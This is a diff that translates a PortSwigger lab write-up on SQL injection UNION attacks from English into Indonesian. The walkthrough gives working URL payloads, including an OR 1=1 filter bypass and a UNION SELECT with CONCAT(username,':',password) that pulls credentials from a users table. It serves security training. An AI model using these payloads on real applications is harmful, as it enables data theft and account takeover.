@@ -1,73 +1,73 @@
-# SQL Injection UNION Attack, Retrieving Multiple Values in a Single Column
+### Serangan SQL Injection UNION, Mengambil Beberapa Nilai dalam Satu Kolom
 
-This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
+Lab ini mengilustrasikan adanya kerentanan SQL injection pada filter kategori produk. Hasil dari query ditampilkan dalam respons aplikasi, sehingga kita dapat menggunakan serangan SQL injection UNION untuk mengambil data dari tabel lain.
 
-The database contains a different table called users, with columns called `username` and `password`.
+Database mengandung tabel lain yang disebut `users`, dengan kolom `username` dan `password`.
 
-To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.
+Untuk menyelesaikan lab ini, lakukan serangan SQL injection UNION yang mengambil semua `username` dan `password`, kemudian gunakan informasi tersebut untuk login sebagai pengguna administrator.
 
-Hint: You can find some useful payloads on our SQL injection cheat sheet.
+Petunjuk: Anda bisa menemukan payload yang berguna pada cheat sheet SQL injection kami.
 
 ---
 
-### **What is CONCAT and How is it Used in SQL Injection?**
+### **Apa Itu CONCAT dan Bagaimana Cara Menggunakannya dalam SQL Injection?**
 
-**CONCAT** is a SQL function used to combine (concatenate) two or more values into a single string. It is particularly useful in SQL injection attacks for merging multiple pieces of data into a single result when the application only displays one column.
+**CONCAT** adalah fungsi SQL yang digunakan untuk menggabungkan (mengconcatenate) dua atau lebih nilai menjadi satu string. Fungsi ini sangat berguna dalam serangan SQL injection untuk menggabungkan beberapa potongan data menjadi satu hasil ketika aplikasi hanya menampilkan satu kolom.
 
-#### **Basic Usage of CONCAT**:
+#### **Penggunaan Dasar CONCAT**:
 ```sql
 SELECT CONCAT('foo', 'bar'); 
--- Result: 'foobar'
+-- Hasil: 'foobar'
 ```
 
-#### **Why Use CONCAT in SQL Injection?**
-In UNION attacks, when the application returns only one column, **CONCAT** can be used to combine multiple values (e.g., `username` and `password`) into a single string. This allows attackers to extract multiple pieces of information in one query.
+#### **Mengapa Menggunakan CONCAT dalam SQL Injection?**
+Dalam serangan UNION, ketika aplikasi hanya mengembalikan satu kolom, **CONCAT** dapat digunakan untuk menggabungkan beberapa nilai (misalnya, `username` dan `password`) menjadi satu string. Hal ini memungkinkan penyerang untuk mengekstrak beberapa informasi dalam satu query.
 
 ---
 
-### **Steps to Perform the Attack**
+### **Langkah-langkah untuk Melakukan Serangan**
 
-#### **Step 1: Analyze the Query Structure**
-By injecting the following payload:
+#### **Langkah 1: Menganalisis Struktur Query**
+Dengan menyuntikkan payload berikut:
 ```
 /filter?category=Gifts'--
 ```
-The application likely executes a query like:
+Aplikasi kemungkinan mengeksekusi query seperti ini:
 ```sql
 SELECT product_name, description 
 FROM products 
 WHERE category = 'Gifts';
 ```
-This query:
-- Returns two columns: `product_name` and `description`.
+Query ini:
+- Mengembalikan dua kolom: `product_name` dan `description`.
 
-#### **Step 2: Determine the Number of Columns**
-To find the number of columns in the original query, inject:
+#### **Langkah 2: Menentukan Jumlah Kolom**
+Untuk mengetahui jumlah kolom pada query asli, injeksikan:
 ```
 /filter?category=Gifts'+union+all+select+NULL,NULL--
 ```
-If no errors occur, the query has two columns.
+Jika tidak ada kesalahan, query ini mengembalikan dua kolom.
 
-#### **Step 3: Use CONCAT to Retrieve Data**
-After determining that the query returns two columns, use the second column to display concatenated strings. For example:
+#### **Langkah 3: Menggunakan CONCAT untuk Mengambil Data**
+Setelah mengetahui bahwa query mengembalikan dua kolom, gunakan kolom kedua untuk menampilkan string yang digabungkan. Sebagai contoh:
 ```
 /filter?category=Gifts'+union+all+select+NULL,CONCAT('foo','bar')--
 ```
 
-#### **Step 4: Retrieve User Data**
-To extract usernames and passwords, use:
+#### **Langkah 4: Mengambil Data Pengguna**
+Untuk mengekstrak `username` dan `password`, gunakan:
 ```
 /filter?category=Gifts'+union+all+select+NULL,CONCAT(username,':',password)+from+users--
 ```
 
-#### **Explanation of the Query**:
-1. The original query:
+#### **Penjelasan Query**:
+1. Query asli:
    ```sql
    SELECT product_name, description 
    FROM products 
    WHERE category = 'Gifts';
    ```
-2. The injected query:
+2. Query yang disuntikkan:
    ```sql
    SELECT product_name, description 
    FROM products 
@@ -76,60 +76,59 @@ To extract usernames and passwords, use:
    SELECT NULL, CONCAT(username, ':', password) 
    FROM users;
    ```
-3. Key details:
-   - `NULL`: Placeholder for the first column, which isn’t relevant here.
-   - `CONCAT(username, ':', password)`: Combines `username` and `password` with a colon (`:`) separator.
+3. Detail penting:
+   - `NULL`: Placeholder untuk kolom pertama, yang tidak relevan di sini.
+   - `CONCAT(username, ':', password)`: Menggabungkan `username` dan `password` dengan pemisah titik dua (`:`).
 
 ---
 
-### **Valid Payloads**
+### **Payload yang Valid**
 
-#### **Initial Test Payloads**:
-- Display 4 items in "Gifts" category:
+#### **Payload Uji Awal**:
+- Menampilkan 4 item dalam kategori "Gifts":
   ```
   /filter?category=Gifts'--
   ```
-- Display all items using a bypass:
+- Menampilkan semua item dengan bypass:
   ```
   /filter?category=Gifts'+or+1=1--
   ```
 
-#### **Determine Column Count**:
-- Use:
+#### **Menentukan Jumlah Kolom**:
+- Gunakan:
   ```
   /filter?category=Gifts'+union+all+select+NULL,NULL--
   ```
 
-#### **Retrieve Concatenated Data**:
-- Combine static strings:
+#### **Mengambil Data yang Digabungkan**:
+- Menggabungkan string statis:
   ```
   /filter?category=Gifts'+union+all+select+NULL,CONCAT('foo','bar')--
   ```
-- Extract user credentials:
+- Mengekstrak kredensial pengguna:
   ```
   /filter?category=Gifts'+union+all+select+NULL,CONCAT(username,':',password)+from+users--
   ```
 
 ---
 
-### **References**
+### **Referensi**
 
 - [SQL Injection UNION Attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
 - [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 
 --- 
 
-### **Illustrations**
+### **Ilustrasi**
 
-#### **Initial Display (Product Name)**:
+#### **Tampilan Awal (Nama Produk)**:
 ![img](images/SQL%20injection%20UNION%20attack,%20retrieving%20multiple%20values%20in%20a%20single%20column/1.png)
 
-#### **Validating Column Count**:
+#### **Memvalidasi Jumlah Kolom**:
 ![img](images/SQL%20injection%20UNION%20attack,%20retrieving%20multiple%20values%20in%20a%20single%20column/2.png)
 
-#### **Using CONCAT with Static Strings**:
+#### **Menggunakan CONCAT dengan String Statis**:
 ![img](images/SQL%20injection%20UNION%20attack,%20retrieving%20multiple%20values%20in%20a%20single%20column/3.png)
 
-#### **Extracting User Data**:
+#### **Mengekstrak Data Pengguna**:
 ![img](images/SQL%20injection%20UNION%20attack,%20retrieving%20multiple%20values%20in%20a%20single%20column/4.png)
-
